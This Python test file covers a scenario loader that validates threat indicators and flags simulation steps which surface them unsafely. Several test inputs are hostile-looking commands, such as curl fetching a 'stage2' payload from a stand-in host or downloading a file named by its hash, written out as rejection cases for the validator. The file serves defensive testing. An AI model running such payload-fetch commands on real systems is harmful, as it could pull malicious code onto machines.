from pathlib import Path

import pytest
import yaml

from engine.scenario_loader import (
    IndicatorSchema, ScenarioSchema, StepSchema, INDICATOR_TYPES, INDICATOR_SAFE_FORMS,
    unsafe_indicator_lines, _schema_to_orm_kwargs,
)

FIXTURE = Path(__file__).resolve().parent.parent / "fixtures" / "scenarios" / "sim-test-prev-001.yml"


def _ind(**kw):
    base = dict(id="ind-01", type="domain", value="rn-stage.example", safe_form="dns_lookup",
                source_url="https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/",
                surfaces_in=["step-01"])
    base.update(kw)
    return base


def _step(cmd, sid="step-01"):
    return dict(id=sid, name="n", identity="www-data", mitre_technique="T1071.001", command=cmd,
                expected_detections=[dict(plane="NDR", type="XQL", description="d")])


def _scenario(**overrides):
    data = yaml.safe_load(FIXTURE.read_text())
    data.update(overrides)
    return ScenarioSchema(**data)


def test_vocabularies_are_exact():
    assert INDICATOR_TYPES == frozenset({"sha256", "sha1", "md5", "domain", "url", "ipv4", "ipv6", "user_agent", "ja3", "ja4"})
    assert INDICATOR_SAFE_FORMS == frozenset({"log_field", "dns_lookup", "hash_only", "wildfire_test_file", "eicar"})


@pytest.mark.parametrize("bad", [
    dict(type="hash"), dict(type="sha256", value="abc"), dict(type="ipv4", value="10.1.2.3", safe_form="log_field"),
    dict(type="domain", value="evil[.]com"), dict(type="url", value="hxxp://evil.com/x", safe_form="log_field"),
    dict(type="domain", value="localhost"), dict(id="indicator-1"),
])
def test_s22_rejects_bad_type_or_malformed_value(bad):
    with pytest.raises(ValueError, match="S-22"):
        IndicatorSchema(**_ind(**bad))


def test_s23_source_url_must_be_unit42_or_panw_github():
    with pytest.raises(ValueError, match="S-23"):
        IndicatorSchema(**_ind(source_url="https://example.com/report"))
    IndicatorSchema(**_ind(source_url="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/x.txt"))


def test_s27_safe_form_must_fit_type():
    with pytest.raises(ValueError, match="S-27"):
        IndicatorSchema(**_ind(type="sha256", value="a" * 64, safe_form="dns_lookup"))
    with pytest.raises(ValueError, match="S-27"):
        IndicatorSchema(**_ind(type="domain", safe_form="hash_only"))
    IndicatorSchema(**_ind(type="sha256", value="a" * 64, safe_form="wildfire_test_file"))


def test_s24_surfaces_in_must_name_existing_steps():
    ind = IndicatorSchema(**_ind(surfaces_in=["step-09"]))
    with pytest.raises(ValueError, match="S-24"):
        _scenario(indicators=[ind.model_dump()], steps=[_step("dig +short rn-stage.example")])
    with pytest.raises(ValueError, match="S-24"):
        IndicatorSchema(**_ind(surfaces_in=[]))


@pytest.mark.parametrize("cmd", [
    "curl -s https://rn-stage.example/stage2 -o /tmp/s2",
    "dig +short rn-stage.example | xargs curl -s",
    "cat > /tmp/c.yml <<YML\nname: beacon to rn-stage.example\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n      dst_domain: other.example\nYML",
])
def test_s25_domain_outside_dns_lookup_or_params_is_rejected(cmd):
    assert any(l.startswith("S-25") for l in unsafe_indicator_lines(
        [IndicatorSchema(**_ind())], [StepSchema(**_step(cmd))]))


@pytest.mark.parametrize("cmd", [
    "dig +short rn-stage.example @${LAB_RESOLVER:-1.1.1.1}",
    "nslookup rn-stage.example", "getent hosts rn-stage.example", "resolvectl query rn-stage.example",
    "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n      dst_domain: rn-stage.example\n      dst_ip: 203.0.113.9\nYML",
])
def test_s25_allows_dns_lookup_lines_and_params_block(cmd):
    assert unsafe_indicator_lines([IndicatorSchema(**_ind())], [StepSchema(**_step(cmd))]) == []


def test_s25_ipv4_never_allowed_in_a_command_outside_params():
    ind = IndicatorSchema(**_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"))
    assert any(l.startswith("S-25") for l in unsafe_indicator_lines([ind], [StepSchema(**_step("ping -c1 203.0.113.9"))]))


def test_s25_matches_whole_tokens_not_substrings():
    ind = IndicatorSchema(**_ind(value="rn-stage.example"))
    assert unsafe_indicator_lines([ind], [StepSchema(**_step("curl https://xrn-stage.example.org/"))]) == []


def test_s26_hash_on_a_fetch_line_is_rejected_but_sha256sum_is_fine():
    h = "b" * 64
    ind = IndicatorSchema(**_ind(type="sha256", value=h, safe_form="hash_only"))
    assert any(l.startswith("S-26") for l in unsafe_indicator_lines([ind], [StepSchema(**_step(f"curl -O https://x/{h}.bin"))]))
    assert any(l.startswith("S-26") for l in unsafe_indicator_lines([ind], [StepSchema(**_step(f"curl -O https://x/{h.upper()}.bin"))]))
    assert unsafe_indicator_lines([ind], [StepSchema(**_step(f"echo '{h}  /tmp/x' | sha256sum -c"))]) == []


def test_scenario_validator_raises_on_unsafe_surfacing():
    with pytest.raises(ValueError, match="S-25"):
        _scenario(indicators=[_ind()], steps=[_step("curl https://rn-stage.example/")])


def test_indicators_persist_and_default_empty():
    s = _scenario(indicators=[_ind()], steps=[_step("dig +short rn-stage.example")])
    assert _schema_to_orm_kwargs(s)["indicators"][0]["value"] == "rn-stage.example"
    assert _schema_to_orm_kwargs(_scenario(steps=[_step("id")]))["indicators"] == []


def test_orm_column_and_to_dict():
    from models import Scenario
    assert Scenario(indicators=[{"id": "ind-01"}]).to_dict()["indicators"] == [{"id": "ind-01"}]


def test_migration_adds_indicators_column():
    from sqlalchemy import create_engine, inspect, text
    from database import _migrate_scenarios_columns
    eng = create_engine("sqlite://")
    with eng.begin() as c:
        c.execute(text("CREATE TABLE scenarios (id INTEGER PRIMARY KEY)"))
        _migrate_scenarios_columns(c)
        cols = {col["name"] for col in inspect(c).get_columns("scenarios")}
    assert "indicators" in cols
